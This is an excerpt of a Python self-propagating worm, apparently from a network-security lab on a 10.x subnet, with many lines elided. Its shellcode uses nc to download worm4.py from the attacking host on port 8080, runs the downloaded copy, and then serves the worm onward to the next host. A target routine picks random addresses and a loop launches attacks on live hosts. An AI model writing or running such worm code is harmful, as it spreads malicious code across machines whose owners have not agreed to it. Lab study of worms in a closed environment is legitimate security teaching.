...
shellcode= (
   ...
   "echo '(^_^) Shellcode is running'; test -f worm4.py || (    "
   " nc -w5 "+socket.gethostbyname(socket.gethostname()) +" 8080 > worm4.py;                   ls;  "
   " python3 worm4.py & nc -lnv 8080 < worm4.py;)              *"
...
def getNextTarget():
   ...
   print(f"attack from {ip}", flush=True)
   
   x = randint(151, 153)
   y = randint(71, 75)
   target = "10." + str(x) + ".0." + str(y)
   return target
...
while True:
    ...
    try:
    	...
    	if result == -1:
    		...
    		print(f"{targetIP} is alive, launch attack", flush=True)
    except:
    	print(f"{targetIP} is not alive", flush=True)
    	exit(0)
